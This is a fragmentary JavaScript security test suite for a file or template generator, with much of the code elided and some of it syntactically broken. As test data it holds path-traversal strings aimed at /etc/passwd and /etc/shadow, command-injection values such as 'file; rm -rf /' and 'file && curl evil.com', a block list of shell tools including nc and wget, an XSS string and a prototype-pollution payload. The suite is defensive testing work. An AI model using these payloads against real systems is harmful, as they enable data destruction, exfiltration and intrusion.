...
describe('Security & Penetration Testing', () => {
  ...
  describe('Input Validation & Sanitization', () => { it('should prevent path traversal attacks', async () => {
      const maliciousOptions = GeneratorFactory.createGenerateOptions({
        generator });

    it('should sanitize template variables to prevent code injection', async () => { const xssPayload = 'alert("XSS")</script>';
    ...
    it('should validate file paths for directory traversal', async () => { const maliciousPaths = [
        '../../../etc/passwd',
    ...
    it('should validate and sanitize frontmatter content', async () => { const maliciousFrontmatter = `---
to }}"
---
Content`;
  ...
  describe('File System Security', () => { it('should enforce file system permissions', async () => {
    ...
    it('should prevent writing to system-critical files', async () => { const systemFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        'C }))
  ...
  describe('Command Injection Prevention', () => { it('should prevent shell command injection in sh frontmatter', async () => {
...
Content`;
    ...
    it('should validate shell commands against allowlist', async () => { const allowedCommands = ['npm', 'yarn', 'git', 'echo', 'ls'];
      const blockedCommands = ['rm', 'curl', 'wget', 'nc', 'dd', 'chmod'];

      const template = `---
to });

    it('should escape command arguments properly', async () => { const dangerousArgs = [
        'file; rm -rf /',
        'file && curl evil.com',
...
Content`;
  ...
  describe('Multi-Tenant Security', () => { it('should isolate tenant data and prevent cross-tenant access', async () => {
      const tenantAUser = UserFactory.createUser({ tenant);
  ...
  describe('Denial of Service (DoS) Protection', () => {
    ...
    it('should rate limit file operations', async () => { const rapidRequests = Array.from({ length, (_, i) =>
  ...
  describe('Information Disclosure Prevention', () => { it('should not expose sensitive system information in errors', async () => {
      const invalidOptions = GeneratorFactory.createGenerateOptions({
        generator } catch (error) { // Error messages should not expose system paths, usernames, etc.
  ...
  describe('Authentication & Authorization', () => { it('should validate user permissions for file operations', async () => {
    ...
    it('should prevent privilege escalation attacks', async () => { const regularUser = UserFactory.createUser({ role);
  ...
  describe('Data Validation & Integrity', () => {
    ...
    it('should validate input size limits', async () => { const oversizedInput = {
        name };
    ...
    it('should prevent prototype pollution attacks', async () => { const pollutionPayload = {
        '__proto__' },
  ...
  describe('Cryptographic Security', () => {
    ...
    it('should handle sensitive data securely', async () => { const sensitiveVariables = {
        apiKey };
  ...
  describe('Security Headers & Configuration', () => { it('should implement secure defaults', () => {
